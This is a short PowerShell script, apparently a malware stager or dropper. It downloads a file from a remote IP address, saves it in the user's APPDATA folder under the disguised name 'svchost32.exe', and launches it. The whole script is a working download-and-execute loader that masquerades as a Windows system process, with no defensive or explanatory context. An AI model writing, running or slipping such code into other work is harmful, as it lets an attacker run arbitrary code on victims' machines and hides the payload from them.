
<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$Stage1Url = 'https://192.0.2.95/stage1.ps1',
    [string]$Stage2Path = "$env:APPDATA\svchost32.exe"
)
(New-Object System.Net.WebClient).DownloadFile($Stage1Url, $Stage2Path)
Start-Process -FilePath $Stage2Path
$StageMarker = "stage-36"
